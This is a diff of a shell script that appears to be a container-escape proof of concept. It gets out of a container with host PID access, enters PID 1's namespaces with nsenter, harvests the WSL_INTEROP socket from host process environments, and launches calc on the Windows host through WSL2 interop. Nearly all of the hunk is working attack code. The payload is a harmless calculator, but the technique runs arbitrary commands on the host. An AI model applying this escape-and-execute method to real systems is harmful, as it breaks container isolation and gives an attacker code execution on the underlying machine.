@@ -77,16 +77,28 @@ fi
 # ── 2) pop calc ──────────────────────────────────────────────
 if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
   echo "[*] WSL2 detected — launching calc via Windows interop"
-  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
-    && echo "[+] calc launched (nsenter+cmd.exe)" && exit 0
-  chroot /host /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
-    && echo "[+] calc launched (chroot+cmd.exe)" && exit 0
-  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
-    -Command "Start-Process calc" 2>&1 \
+  # WSL2->Windows interop needs WSL_INTEROP (the per-session /run/WSL/<id>_interop
+  # socket) in the launching env. nsenter RESETS the environment, so a bare
+  # `nsenter -- cmd.exe` no-ops even though the escape itself worked. pidmode:host
+  # exposes the host PID ns — harvest a live WSL_INTEROP and pass it through.
+  interop=""
+  for e in /proc/*/environ; do
+    v=$(tr "\0" "\n" < "$e" 2>/dev/null | sed -n "s/^WSL_INTEROP=//p" | head -1)
+    [ -n "$v" ] && { interop="$v"; break; }
+  done
+  if [ -n "$interop" ]; then
+    echo "[*] harvested WSL_INTEROP=$interop"
+  else
+    echo "[!] no WSL_INTEROP in host procs — interop launch may still no-op"
+  fi
+  runwin() { nsenter -t 1 -m -u -i -n -p -- env WSL_INTEROP="$interop" "$@"; }
+  runwin /bin/sh -c "cd /mnt/c && exec /mnt/c/Windows/System32/cmd.exe /c start calc" 2>&1 \
+    && echo "[+] calc launched (cmd.exe start)" && exit 0
+  runwin /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
+    -NoProfile -Command "Start-Process calc" 2>&1 \
     && echo "[+] calc launched (powershell)" && exit 0
-  chroot /host /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
-    -Command "Start-Process calc" 2>&1 \
-    && echo "[+] calc launched (chroot+powershell)" && exit 0
+  runwin /mnt/c/Windows/System32/calc.exe 2>&1 \
+    && echo "[+] calc launched (calc.exe)" && exit 0
   echo "[!] all WSL2 calc methods failed — check proof file: $PROOF"
 else
   echo "[*] native Linux — launching calc"
